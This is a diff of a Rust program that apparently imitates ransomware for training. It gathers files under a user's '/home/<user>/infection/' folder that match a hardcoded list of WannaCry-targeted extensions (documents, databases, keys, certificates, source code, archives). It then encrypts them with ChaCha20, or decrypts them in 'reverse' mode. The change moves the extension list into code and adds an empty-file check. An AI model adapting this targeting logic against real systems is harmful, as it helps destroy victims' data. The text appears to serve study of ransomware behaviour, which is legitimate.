@@ -2,8 +2,8 @@ use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher};
 use std::str;
 use std::env;
-use glob::{GlobError, glob};
-use std::path::{Path, PathBuf};
+use glob::glob;
+use std::path::PathBuf;
 use std::ffi::OsStr;
 use clap::Parser;
 use hmac::{Hmac, Mac};
@@ -41,6 +41,14 @@ fn get_file_data(filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Erro
         Ok(metadata) => {
             if metadata.len() > 1000000000 {
                 return Err("File too big".into());
+            }
+            else if metadata.len() == 0 {
+                if let Some(filepath_str) = filepath.to_str() {
+                    return Err(format!("{} => unsuccessfull : file empty", filepath_str).into());
+                }
+                else {
+                    return Err("file empty".into());
+                }
             }
             else {
                 file_len = metadata.len() as usize;
@@ -215,39 +223,23 @@ fn get_result(filepath: &PathBuf, new_filepath: &PathBuf) -> String {
 }
 
 fn get_extensions() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    let wannacry_ext = get_file_data(&Path::new("wannacry_known_extensions.txt").to_path_buf())?;
-
-    let str = match std::str::from_utf8(&wannacry_ext) {
-        Ok(s) => s,
-        Err(_e) => panic!("Can't find wannacry_known_extensions.txt"),
-    };
-
-    let str = str.replace(".", "");
-
-    let v_ext: Vec<String> = str
-    .lines()
-    .map(|s| s.replace(".", ""))
-    .filter(|s| !s.is_empty())
+    let wannacry_ext = vec!["ft", "gif", "der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds", "max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std", "uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "accdb", "mdb", "db", "dbf", "odb", "frm", "ft", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c", "cpp", "pas", "h", "asm", "js", "cmd", "bat", "ps1", "vbs", "vb", "pl", "dip", "dch", "sch", "brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla", "wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma", "mid", "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "png", "bmp", "jpg", "jpeg", "vcd", "iso", "backup", "zip", "rar", "7z", "gz", "tgz", "tar", "bak", "tbk", "bz2", "PAQ", "ARC", "aes", "gpg", "vmx", "vmdk", "vdi", "sldm", "sldx", "sti", "sxi", "602", "hwp", "snt", "onetoc2", "dwg", "pdf", "wk1", "wks", "123", "rtf", "csv", "txt", "vsdx", "vsd", "edb", "eml", "msg", "ost", "pst", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", "pot", "pptm", "pptx", "ppt", "xltm", "xltx", "xlc", "xlm", "xlt", "xlw", "xlsb", "xlsm", "xlsx", "xls", "dotx", "dotm", "dot", "docm", "docb", "docx", "doc"]
+    .into_iter()
+    .map(String::from)
     .collect();
-
-    Ok(v_ext)
+    Ok(wannacry_ext)
 }
 
-fn insert_in_vector(entry: Result<PathBuf, GlobError>, valid_files: &mut Vec<PathBuf>, v_ext: &[String]) {
-    match entry {
-        Ok(path) => {
-            for ext in v_ext {
-                if path
-                    .extension()
-                    .and_then(|ext| ext.to_str())
-                    .filter(|&ext_str| ext_str == ext)
-                    .is_some()
-                    {
-                        valid_files.push(path.clone());
-                    }
-            }
-        },
-        Err(e) => println!("{:?}", e),
+fn insert_in_vector(entry: &PathBuf, valid_files: &mut Vec<PathBuf>, v_ext: &[String]) {
+    for ext in v_ext {
+        if entry
+            .extension()
+            .and_then(|ext| ext.to_str())
+            .filter(|&ext_str| ext_str == ext)
+            .is_some()
+        {
+            valid_files.push(entry.clone());
+        }
     }
 }
 
@@ -256,20 +248,18 @@ fn get_valid_files(v_ext: &[String], user: &str, extensions: &str) -> Vec<PathBu
 
     let master_path = format!("/home/{}/infection/", user);
 
+    // println!("{}", master_path);
+
     for entry in glob(&format!("{}{}", master_path, extensions)).expect("Failed to list directory") {
-        insert_in_vector(entry,&mut valid_files, v_ext);
+        if let Ok(path) = entry {
+            insert_in_vector(&path, &mut valid_files, &v_ext);
+        }
     }
+    
     valid_files.sort_unstable();
     valid_files.dedup();
     valid_files
 }
-
-// fn debug_files(files: &[PathBuf]) {
-//     println!("found {} file(s)", files.len());
-//     for file in files {
-//         println!("{}", file.display());
-//     }
-// }
 
 fn main() -> Result<(), Box<dyn std::error::Error>>{
 
@@ -302,7 +292,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>>{
 
 
     let v_ext = get_extensions()?;
-
+    
     let valid_files: Vec<PathBuf>;
 
     if args.reverse.is_some() {
@@ -312,13 +302,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>>{
         valid_files = get_valid_files(&v_ext, &user, "**/*");
     }
 
+    // for file in valid_files.iter().clone() {
+    //     println!("{}", file.display());
+    // }
+
     if valid_files.is_empty() {
         return Err("Path doesn't contain file".into());
     }
 
-    // if !items.silent {
-    //     debug_files(&valid_files);
-    // }
 
     for file in &valid_files {
         if args.reverse.is_some() {
